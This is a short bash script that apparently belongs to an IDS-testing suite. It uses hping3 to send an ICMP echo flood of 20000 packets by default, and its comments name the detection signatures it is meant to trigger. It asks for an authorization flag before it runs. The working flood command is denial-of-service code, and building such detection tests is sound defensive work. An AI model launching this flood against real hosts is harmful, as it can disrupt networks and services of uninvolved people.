#!/usr/bin/env bash
# icmp-flood.sh - ICMP Echo flood with hping3.
# Needs: hping3, root.
# Triggers: sid 1000020 (ICMP Echo flood against one destination),
#           sid 1000021 (from one source).
. "$(cd "$(dirname "$0")" && pwd)/_lib.sh"

usage() { cat <<U
Usage: $PROG --i-have-authorization -t TARGET [-c COUNT] [-d SIZE]
  -c COUNT  packets to send (default 20000)
  -d SIZE   ICMP payload bytes (default 56)
U
}

TARGET=""; COUNT=20000; SIZE=56
while [ $# -gt 0 ]; do
  case $1 in
    --i-have-authorization) AUTHORIZED=1 ;;
    -t|--target) TARGET=${2:?}; shift ;;
    -c|--count) COUNT=${2:?}; shift ;;
    -d|--size) SIZE=${2:?}; shift ;;
    -h|--help) usage; exit 0 ;;
    *) die "unknown argument: $1 (see --help)" ;;
  esac
  shift
done

need_tool hping3 "install hping3"
need_root
authorize "$TARGET"
set -x
exec hping3 --icmp -d "$SIZE" -i u150 -c "$COUNT" "$TARGET"
